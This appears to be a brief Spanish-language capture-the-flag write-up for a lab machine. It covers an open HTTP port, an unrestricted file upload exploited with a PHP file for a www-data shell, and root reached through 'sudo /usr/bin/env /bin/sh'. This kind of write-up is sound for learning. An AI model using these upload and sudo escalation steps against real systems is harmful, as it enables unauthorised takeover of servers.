PORT   STATE SERVICE
80/tcp open  http

-Nos encontramos con una web que nos permite subir un archivo

-Hacemos fuzzing y vemos que los archivos subidos se almacenan en /uploads

-Subimos un archivo PHP y obtenemos acceso al servidor

www-data@f1a8743df413:/$

## Escalada de Privilegios

-sudo -l:
	root) NOPASSWD: /usr/bin/env

-Explotamos el binario:
	sudo /usr/bin/env /bin/sh
	root@f1a8743df413:/# whoami
	root